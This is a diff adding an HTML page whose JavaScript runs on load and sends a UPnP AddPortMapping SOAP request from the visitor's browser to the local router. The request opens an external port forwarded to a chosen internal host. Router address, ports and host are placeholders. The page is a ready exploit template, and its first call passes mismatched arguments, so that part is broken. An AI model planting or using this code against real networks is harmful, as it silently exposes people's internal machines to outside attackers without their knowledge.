@@ -1,0 +1,57 @@
+<html>
+<head>
+</head>
+<body>
+<script type="text/javascript">
+
+
+addPortForwardingRuleWithUpnp("http://[ROUTER_INTERNAL_IP]:[ROUTER_UPNP_PORT]", "http://[ROUTER_INTERNAL_IP]:[ROUTER_UPNP_PORT]/[UPNP_COMMAND_PATH]", "[EXT_PORT]", "[INT_PORT]", "[INT_HOST]")
+	
+	function addPortForwardingRuleWithUpnp(routerUPnPCtrlPath, extPort, intPort, intHost) {
+		
+
+		var xhr = new XMLHttpRequest();
+		var IPorPPP = "WANPPPConnection"
+		// There are routers which the relevant value is: IPorPPP = "WANIPConnection"
+				
+		xhr.open('POST', routerUPnPCtrlPath, true);
+
+		// build SOAP request
+		
+		var sr =
+			'<?xml version="1.0" encoding="utf-8"?>' +
+			'<s:Envelope s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/" xmlns:s="http://schemas.xmlsoap.org/soap/envelope/">'+
+			'<s:Body>'+
+			'<u:AddPortMapping xmlns:u="urn:schemas-upnp-org:service:XXX:1">'+
+			'<NewRemoteHost></NewRemoteHost>'+
+			'<NewExternalPort>[EXT_PORT]</NewExternalPort>'+
+			'<NewProtocol>TCP</NewProtocol>'+
+			'<NewInternalPort>[INT_PORT]</NewInternalPort>'+
+			'<NewInternalClient>[INT_HOST]</NewInternalClient>'+
+			'<NewEnabled>1</NewEnabled>'+                  
+			'<NewPortMappingDescription>Test desc</NewPortMappingDescription>'+ 
+			'<NewLeaseDuration>0</NewLeaseDuration>'+           
+			'</u:AddPortMapping>'+
+			'</s:Body>'+
+			'</s:Envelope>';
+			sr = sr.replace("[EXT_PORT]", extPort);
+			sr = sr.replace("[INT_PORT]", intPort);
+			sr = sr.replace("[INT_HOST]", intHost);
+			sr = sr.replace("XXX", IPorPPP);
+		
+		
+		// Send the POST request
+		xhr.setRequestHeader('SOAPAction', '"urn:schemas-upnp-org:service:XXX:1#AddPortMapping"'.replace("XXX", IPorPPP));
+		xhr.send(sr);
+
+	}
+
+	function router() {
+	addPortForwardingRuleWithUpnp("http://[ROUTER_INTERNAL_IP]:[ROUTER_UPNP_PORT]/[UPNP_COMMAND_PATH]", "[EXT_PORT]", "[INT_PORT]", "[INT_HOST]")
+	}
+	
+	router()
+	
+</script>
+</body>
+</html>
